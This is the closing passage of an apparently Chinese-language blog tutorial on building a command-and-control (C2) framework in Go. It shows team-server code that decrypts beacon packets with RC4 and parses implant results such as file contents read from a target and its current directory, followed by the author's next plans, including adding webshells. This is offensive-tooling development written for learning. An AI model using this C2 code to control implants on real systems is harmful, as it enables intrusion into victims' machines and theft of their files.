</span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;beacon type %v does not exists&quot;</span>, beaconId)  </span><br><span class="line">    &#125;  </span><br><span class="line">    beacon, _ := value.(*Beacon)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> beacon.Data.Async &#123;  </span><br><span class="line">       beacon.Data.LastTick = <span class="type">int</span>(time.Now().Unix())  </span><br><span class="line">       beacon.Tick = <span class="literal">true</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> beacon.Data.Mark == <span class="string">&quot;Inactive&quot;</span> &#123;  </span><br><span class="line">       beacon.Data.Mark = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bodyData) &gt; <span class="number">4</span> &#123;  </span><br><span class="line">       _, err := ts.Handler.BeaconProcessData(beacon.Data, bodyData)  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon.go</code> 补充BeaconProcessData</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> BeaconProcessData(beaconData response.BeaconData, packedData []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    beaconHandler, ok := h.BeaconHandlers[beaconData.Name]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;module not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> beaconHandler.BeaconProcessData(beaconData, packedData)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 定义BeaconProcessData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    BeaconGenerate(beaconConfig request.GenerateConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconCreate(beat []<span class="type">byte</span>) (response.BeaconData, <span class="type">error</span>)  </span><br><span class="line">    BeaconCommand(client <span class="type">string</span>, cmdline <span class="type">string</span>, beaconData response.BeaconData, args <span class="keyword">map</span>[<span class="type">string</span>]any) <span class="type">error</span>  </span><br><span class="line">    BeaconPackData(beaconData response.BeaconData, tasks []response.TaskData) ([]<span class="type">byte</span>, <span class="type">error</span>)  </span><br><span class="line">    BeaconProcessData(beaconData response.BeaconData, packedData []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_main.go</code> 实现BeaconProcessData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> BeaconProcessData(beaconData response.BeaconData, packedData []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    decryptData, err := b.DecryptData(packedData, beaconData.SessionKey)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    taskData := response.TaskData&#123;  </span><br><span class="line">       Type:        TYPE_TASK,  </span><br><span class="line">       BeaconId:     beaconData.Id,  </span><br><span class="line">       FinishDate:  time.Now().Unix(),  </span><br><span class="line">       MessageType: MESSAGE_SUCCESS,  </span><br><span class="line">       Completed:   <span class="literal">true</span>,  </span><br><span class="line">       Sync:        <span class="literal">true</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    err = b.ProcessTasksResult(b.ts, beaconData, taskData, decryptData)  </span><br><span class="line">    <span class="keyword">if</span> err!= <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code> 补充DecryptData方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> DecryptData(data []<span class="type">byte</span>, key []<span class="type">byte</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">    <span class="keyword">return</span> RC4Crypt(data, key)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/types.go</code> 补充COMMAND_ERROR_REPORT常量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	COMMAND_CAT          = <span class="number">1</span></span><br><span class="line">	COMMAND_CD           = <span class="number">2</span></span><br><span class="line">	COMMAND_ERROR_REPORT = <span class="number">100</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><code>handler/beacon/beacon_handler.go</code>创建解析器解析然后包，并将结果信息输出到服务器的控制台，正常来说说要将taskdata的信息通过sync包同步到指定用户的控制台，这一块我不在这本项目实现。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *BeaconHandler)</span></span> ProcessTasksResult(ts TeamServer, beaconData response.BeaconData, taskData response.TaskData, packedData []<span class="type">byte</span>) <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建一个新的packer  </span></span><br><span class="line">    parser := CreateParser(packedData)  </span><br><span class="line">    <span class="keyword">if</span> <span class="literal">false</span> == parser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>, <span class="string">&quot;int32&quot;</span>&#125;) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;data length not match&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    resultData := parser.ParseBytes()  </span><br><span class="line">    resultParser := CreateParser(resultData)  </span><br><span class="line">    taskId := resultParser.ParseInt32()  </span><br><span class="line">    commandId := resultParser.ParseInt32()  </span><br><span class="line">    task := taskData  </span><br><span class="line">    task.TaskId = fmt.Sprintf(<span class="string">&quot;%08x&quot;</span>, taskId)  </span><br><span class="line">    <span class="keyword">switch</span> commandId &#123;  </span><br><span class="line">    <span class="keyword">case</span> COMMAND_CAT:  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 检查结果数据长度  </span></span><br><span class="line">       <span class="keyword">if</span> <span class="literal">false</span> == resultParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;array&quot;</span>, <span class="string">&quot;array&quot;</span>&#125;) &#123;  </span><br><span class="line">          <span class="keyword">return</span> errors.New(<span class="string">&quot;result data length not match&quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析文件路径和文件内容  </span></span><br><span class="line">       path := ConvertCpToUTF8(resultParser.ParseString(), beaconData.ACP)  </span><br><span class="line">       fileContent := resultParser.ParseBytes()  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 构造任务消息  </span></span><br><span class="line">       task.Message = fmt.Sprintf(<span class="string">&quot;&#x27;%v&#x27; file content:&quot;</span>, path)  </span><br><span class="line">       task.ClearText = <span class="type">string</span>(fileContent)  </span><br><span class="line">    <span class="keyword">case</span> COMMAND_CD:  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 检查是否有足够的数据  </span></span><br><span class="line">       <span class="keyword">if</span> <span class="literal">false</span> == resultParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;array&quot;</span>&#125;) &#123;  </span><br><span class="line">          <span class="keyword">return</span> errors.New(<span class="string">&quot;result data length not match&quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析目录路径  </span></span><br><span class="line">       path := ConvertCpToUTF8(resultParser.ParseString(), beaconData.ACP)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 构造任务消息  </span></span><br><span class="line">       task.Message = <span class="string">&quot;Current directory:&quot;</span>  </span><br><span class="line">       task.ClearText = path  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">case</span> COMMAND_ERROR_REPORT:  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 检查是否有足够的数据  </span></span><br><span class="line">       <span class="keyword">if</span> <span class="literal">false</span> == resultParser.Check([]<span class="type">string</span>&#123;<span class="string">&quot;array&quot;</span>&#125;) &#123;  </span><br><span class="line">          <span class="keyword">return</span> errors.New(<span class="string">&quot;result data length not match&quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析错误信息  </span></span><br><span class="line">       errorMsg := ConvertCpToUTF8(<span class="type">string</span>(resultParser.ParseBytes()), beaconData.ACP)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 构造任务消息  </span></span><br><span class="line">       task.Message = <span class="string">&quot;Error report:&quot;</span>  </span><br><span class="line">       task.ClearText = errorMsg  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;unknown command&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;messageType: %v, message: %v, clearText: %v\n&quot;</span>, task.MessageType, task.Message, task.ClearText)  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，所有代码编写完成，难掩兴奋与激动，开始见证奇迹的一刻！</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/08/02/22-03-13-844760c8c1834618a90ef3d206ad13e3-20250802220312-9daf96.png"></p>
<h1 id="下一步计划"><a href="#下一步计划" class="headerlink" title="下一步计划"></a>下一步计划</h1><p>写到这里真的有点神志不清，可以看到后面我真的写的不耐烦了，到这里终于是写完了这篇又臭又长的文章了，每当写到文章的末尾总是头昏脑涨，写文章真是一件特别痛苦的事，尤其是长文。</p>
<p>可以看到我在文章中贴出完整的源码，看起来很繁琐实际也很繁琐但这是有必要的，因为这样就可以根据每一章节一步步构建出C2，这种方式是我学习一个陌生项目的基本做法。还有文章中并没有对代码做详细的解释，各位师傅可以用AI来辅助阅读。</p>
<p>考虑到文章呈现内容的局限性不能完整的体现开发过程，所以想录几个视频玩一玩ヾ(≧▽≦*)o</p>
<p>我承诺<strong>不开班，不收费，不搞圈子，纯粹的技术分享</strong>，可能是我不在这个圈子才敢这么做，所以求个<strong>点赞、收藏加关注</strong>不过分吧？(◍•ᴗ•◍)。</p>
<p>由于是社畜且不在安全领域，所以几个月或者几年开始录视频？反正这段时间好好休息一下，一个人的经历总是有限的，我又能拼搏几次呢？做出c2后我还想将webshell融入其中，正好web安全是我的薄弱项，借此机会学习一下，但这也是遥远未来之后的事了。</p>
<p>相信看过这篇文章之后，想必各位师傅对C2框架搭建是很熟悉了，这样就可以去github上找开源的C2的源码，最好是可以调式运行的，然后慢慢熟悉工作流程，最后积累自己的开发C2框架的经验。</p>
<p><strong>下一步计划就是没有计划</strong>٩( ╹▿╹ )۶，随缘更新文章，内容随机，还有Convert2Shellcode项目开始修复我老早就提出的问题，然后编写支持x86架构的代码，也请各位师傅多多支持一下。</p>
<p><strong>最后的最后要说的一点就是最近在弄一个新博客，也算是新的开始，期待与各位师傅交互友链</strong>！</p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2025/10/14/C2%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AHTTP-s-%E3%80%81mTLS%E3%80%81WebSocket%E3%80%81DNS/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2025-10-14 22:05:59
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="Categories"></i>
                    
                    <span class="span--category">
                      <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-C2/" title="安全开发_C2">
                        <b>#</b> 安全开发_C2
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2025/10/23/%E6%96%B0%E7%94%B5%E8%84%91/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%86%8C%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8"><span class="toc-text">一、路由注册和服务器启动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-Go%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%B8%8E%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5"><span class="toc-text">1.1 Go的面向对象与依赖注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">1.2 服务器配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%86%8C"><span class="toc-text">1.3 路由注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E6%97%A5%E5%BF%97%E5%99%A8"><span class="toc-text">1.4 中间件与日志器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%8A%A8"><span class="toc-text">1.5 服务器启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95"><span class="toc-text">1.6 一个简单的接口测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%9B%91%E5%90%AC%E5%99%A8%E9%85%8D%E7%BD%AE%E5%92%8C%E7%9B%91%E5%90%AC%E5%99%A8%E5%90%AF%E5%8A%A8"><span class="toc-text">二、监听器配置和监听器启动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="toc-text">2.1 大致流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-text">2.2 代码编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95"><span class="toc-text">2.3 接口测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%94%9F%E6%88%90Beacon"><span class="toc-text">三、生成Beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%A4%A7%E8%87%B4%E6%B5%81%E7%A8%8B"><span class="toc-text">3.1 大致流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-text">3.2 代码编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95"><span class="toc-text">3.3 接口测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Beacon%E4%B8%8A%E7%BA%BF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E5%AE%8C%E6%88%90%E6%B3%A8%E5%86%8C"><span class="toc-text">四、Beacon上线服务器并完成注册</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E8%A7%A3%E5%AF%86%E9%85%8D%E7%BD%AE-Beacon%E7%AB%AF"><span class="toc-text">4.1 解密配置-Beacon端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E5%BF%83%E8%B7%B3%E5%8C%85-Beacon%E7%AB%AF"><span class="toc-text">4.2 收集系统信息生成心跳包-Beacon端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E6%B3%A8%E5%86%8C-server%E7%AB%AF"><span class="toc-text">4.3 注册-server端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E6%B5%8B%E8%AF%95"><span class="toc-text">4.4 测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%BB%BB%E5%8A%A1%E4%B8%8B%E5%8F%91"><span class="toc-text">五、任务下发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E4%BB%BB%E5%8A%A1%E5%88%9B%E5%BB%BA"><span class="toc-text">5.1 任务创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E4%BB%BB%E5%8A%A1%E8%8E%B7%E5%8F%96"><span class="toc-text">5.2 任务获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E6%B5%8B%E8%AF%95"><span class="toc-text">5.3 测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-1-%E4%BB%BB%E5%8A%A1%E5%88%9B%E5%BB%BA"><span class="toc-text">5.3.1 任务创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-2-%E4%BB%BB%E5%8A%A1%E8%8E%B7%E5%8F%96"><span class="toc-text">5.3.2 任务获取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%93%E6%9E%9C%E5%9B%9E%E6%98%BE"><span class="toc-text">六、任务执行与结果回显</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-%E4%BB%BB%E5%8A%A1%E5%8C%85%E8%A7%A3%E8%AF%BB-Beacon%E7%AB%AF"><span class="toc-text">6.1 任务包解读-Beacon端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%E5%B9%B6%E6%89%93%E5%8C%85%E7%BB%93%E6%9E%9C"><span class="toc-text">6.2 任务执行并打包结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E"><span class="toc-text">6.3 结果返回</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-%E7%BB%93%E6%9E%9C%E5%A4%84%E7%90%86"><span class="toc-text">6.4 结果处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8B%E4%B8%80%E6%AD%A5%E8%AE%A1%E5%88%92"><span class="toc-text">下一步计划</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
        placeholder: 'Welcome!',
        avatar: 'retro',
        lang: 'en'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright © 2025 oneday</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
